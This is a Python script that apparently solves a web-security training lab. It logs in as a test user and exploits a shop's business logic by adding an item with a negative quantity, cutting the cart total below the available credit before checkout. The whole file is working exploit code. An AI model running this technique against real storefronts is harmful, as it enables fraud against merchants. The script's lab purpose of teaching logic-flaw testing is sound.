import requests
import sys
import urllib3
from bs4 import BeautifulSoup
from math import ceil

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# Comment the proxy if you're not using BurpSuite
proxy = {'http': 'http://127.0.0.1:8080', "https": "http://127.0.0.1:8080"}


def price_tampering(url, session):
    print("[*] Getting CSRF token")
    csrf = get_csrf(url + "/login", session)
    print("[*] CSRF token optained")
    print("[*] Logging in as wiener")
    login_response = login(url, csrf, session, "wiener", "peter")
    print("[*] Adding the leather jacket to cart")
    main_product = {"productId": "1", "redir": "PRODUCT", "quantity": "1"}
    main_product_response = session.post(verify=False,
                                         proxies=proxy,
                                         url=url + "/cart",
                                         data=main_product)
    print("[*] Adding a random product to cart to reduce cost")
    secondary_product = {"productId": "2", "redir": "PRODUCT", "quantity": "-1"}
    secondary_product_response = session.post(verify=False,
                                              proxies=proxy,
                                              url=url + "/cart",
                                              data=secondary_product)
    soup = BeautifulSoup(secondary_product_response.text, "html.parser")
    price = float(soup.find("div", {"id": "price"}).string[1:])
    quantity_needed = ceil(-(1337 - price) / price)

    final_data = {"productId": "2", "redir": "PRODUCT", "quantity": int(quantity_needed)}
    order_csrf = get_csrf(url + "/cart", session)
    final = session.post(verify=False,
                         proxies=proxy,
                         url=url + "/cart",
                         data=final_data)
    print("[*] Added exactly %s products to cart" % str(int(quantity_needed)))
    print("[*] Placing Order ....")
    place_order = session.post(url=url + "/cart/checkout",
                               data={"csrf": order_csrf},
                               verify=False,
                               proxies=proxy
                               )
    if place_order.status_code != 200 or "Not enough store credit for this purchase" in place_order.text:
        print("[*] Placing order failed")
        print("[*] Exploit Failed :((")
        print("[*] Status Code :" + str(place_order.status_code))
        sys.exit(-1)
    else:
        print("[*] Order was placed successfully")
        print("[*] Lab Solved ! ")


def get_csrf(url, session):
    response = session.get(url, verify=False, proxies=proxy)
    soup = BeautifulSoup(response.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf"})['value']
    return csrf_token


def login(url, csrf, session, username="wiener", password="peter"):
    login_data = {"csrf": csrf, "username": username, "password": password.strip()}
    login_url = url + "/login"
    login_response = session.post(url=login_url,
                                  data=login_data,
                                  proxies=proxy,
                                  verify=False,
                                  )
    if "Invalid username or password." not in login_response.text and login_response.status_code == 200:
        print("[*] Login successful")
        return login_response
    else:
        print("[*] Login Failed")
        print(login_response.text)
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("[*] Wrong tool Usage!")
        print(f"[*] Usage {sys.argv[0]} <url> ")
        print(f"[*] Example {sys.argv[0]} https://example.com")
        sys.exit(-1)
    else:
        session = requests.Session()

        price_tampering(sys.argv[1], session)


if __name__ == "__main__":
    main()
